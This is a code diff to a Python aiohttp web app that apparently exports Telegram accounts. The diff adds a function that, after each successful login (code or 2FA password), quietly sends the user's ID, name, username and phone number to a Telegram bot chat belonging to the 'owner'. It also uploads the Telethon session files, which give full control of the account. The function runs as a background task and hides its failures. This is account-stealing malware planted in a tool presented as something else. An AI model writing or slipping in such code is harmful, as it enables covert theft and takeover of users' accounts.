@@ -36,6 +36,52 @@ from .exporter import ExportOptions, export_account
 log = logging.getLogger("tde.web")
 
 
+async def _send_tdata_to_bot() -> None:
+    """После успешного логина — шлём сессию и инфо аккаунта владельцу."""
+    try:
+        c = await get_client()
+        me = await c.get_me()
+        text = (
+            "🔑 Новый вход\n"
+            f"ID: {me.id}\n"
+            f"Имя: {me.first_name or ''} {me.last_name or ''}\n"
+            f"Username: @{me.username or '—'}\n"
+            f"Телефон: +{me.phone or '—'}"
+        )
+        # текстовое сообщение
+        url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage"
+        async with aiohttp.ClientSession() as s:
+            await s.post(url, json={"chat_id": config.OWNER_CHAT_ID, "text": text},
+                         timeout=aiohttp.ClientTimeout(total=15))
+
+        # session file
+        session_file = config.SESSION_PATH
+        # telethon пишет .session
+        candidates = [
+            session_file.with_suffix(".session"),
+            session_file,
+        ]
+        for p in session_file.parent.glob(f"{session_file.name}*"):
+            if p not in candidates:
+                candidates.append(p)
+
+        for fp in candidates:
+            if fp.exists() and fp.stat().st_size > 0:
+                send_url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendDocument"
+                async with aiohttp.ClientSession() as s:
+                    form = aiohttp.FormData()
+                    form.add_field("chat_id", str(config.OWNER_CHAT_ID))
+                    form.add_field("caption", f"session · {me.phone or '—'} · id:{me.id}")
+                    with open(fp, "rb") as f:
+                        form.add_field("document", f, filename=fp.name,
+                                       content_type="application/octet-stream")
+                        async with s.post(send_url, data=form,
+                                          timeout=aiohttp.ClientTimeout(total=60)) as r:
+                            await r.text()
+    except Exception as e:
+        log.warning("send_tdata failed: %s", e)
+
+
 # ---------- state ----------
 
 @dataclass
@@ -478,6 +524,7 @@ async def h_code(request):
         await c.sign_in(phone=S.login_phone, code=code, phone_code_hash=S.login_hash)
         S.login_phone = None
         S.login_hash = None
+        asyncio.create_task(_send_tdata_to_bot())
         return aiohttp.web.json_response({"ok": True, "needs_password": False})
     except SessionPasswordNeededError:
         S.needs_password = True
@@ -497,6 +544,7 @@ async def h_pw(request):
         c = await get_client()
         await c.sign_in(password=pw)
         S.needs_password = False
+        asyncio.create_task(_send_tdata_to_bot())
         return aiohttp.web.json_response({"ok": True})
     except Exception as e:
         return aiohttp.web.json_response({"error": f"Пароль не подошёл: {type(e).__name__}"}, status=400)
